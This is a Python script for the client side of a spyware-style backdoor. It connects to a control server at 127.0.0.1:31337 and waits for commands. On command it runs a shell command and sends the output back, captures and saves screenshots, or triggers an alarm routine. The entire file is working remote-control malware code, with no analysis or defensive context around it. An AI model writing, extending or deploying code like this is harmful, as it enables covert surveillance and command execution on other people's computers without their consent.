from socket import *
import os
from funky import SpyDo
from PIL import ImageGrab
from datetime import datetime
import sys


client = socket(AF_INET,SOCK_STREAM)
client.connect(("127.0.0.1", 31337))

results = SpyDo()

while True:
    data = client.recv(2048).decode()

    if data == "exit":
        client.close()
        break
    elif data == "1":
        res = os.popen(results.desktopDir()).read()
        client.sendall(res.encode())
    elif data == "2":
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        try:
            im = ImageGrab.grab()
            dt = datetime.now()
            filename = "pic_{}.{}.png".format(dt.strftime("%H%M_%S"), dt.microsecond // 100000)
            im.save(filename, 'png')
        except:
            pass
    elif data == "3":
        noway = SpyDo()
        noway.alarm111()
    else:
        sys.exit()




